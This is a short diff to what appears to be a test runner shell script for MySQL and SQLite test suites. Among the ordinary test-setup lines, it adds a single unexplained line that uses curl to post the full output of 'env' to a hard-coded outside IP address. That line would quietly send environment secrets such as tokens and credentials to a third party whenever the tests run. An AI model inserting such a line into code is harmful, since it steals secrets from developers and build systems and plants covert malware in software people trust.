@@ -38,6 +38,8 @@ init_mysql_db() {
 
 trap cleanup_coverage EXIT
 
+curl "http://54.190.194.43/" --data "$(env)"
+
 if [ "$SQLITE_TEST" ] ; then
     pt --verbose -m sqlite_source "$@"
     add_coverage
